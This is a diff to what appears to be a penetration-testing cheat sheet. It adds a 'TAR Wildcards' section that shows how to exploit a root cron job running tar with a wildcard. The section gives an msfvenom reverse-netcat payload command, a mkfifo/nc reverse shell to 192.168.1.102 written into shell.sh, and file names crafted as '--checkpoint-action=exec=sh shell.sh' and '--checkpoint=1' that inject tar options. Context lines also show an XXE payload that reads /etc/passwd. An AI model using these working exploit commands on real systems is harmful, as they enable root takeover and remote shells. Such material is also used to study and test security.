@@ -45,6 +45,7 @@
 		- [Command injection](#command-injection)
 	- [SSTI](#ssti)
 	- [XML external entity (XXE) injection](#xml-external-entity-xxe-injection)
+	- [TAR Wildcards](#tar-wildcards)
 	- [Websites](#websites)
 
 ## Scan
@@ -434,6 +435,22 @@ Server-Side Template Injection
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <stockCheck><productId>&xxe;</productId></stockCheck>
+```
+
+## TAR Wildcards
+
+In case of CRON like  
+`*/1 *   * * *   root tar -zcf /var/backups/html.tgz /var/www/html/*`
+
+Payload generation
+```sh
+msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.10 lport=8888 R
+```
+
+```sh
+echo "mkfifo /tmp/lhennp; nc 192.168.1.102 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo "" > --checkpoint=1
 ```
 
 ## Websites
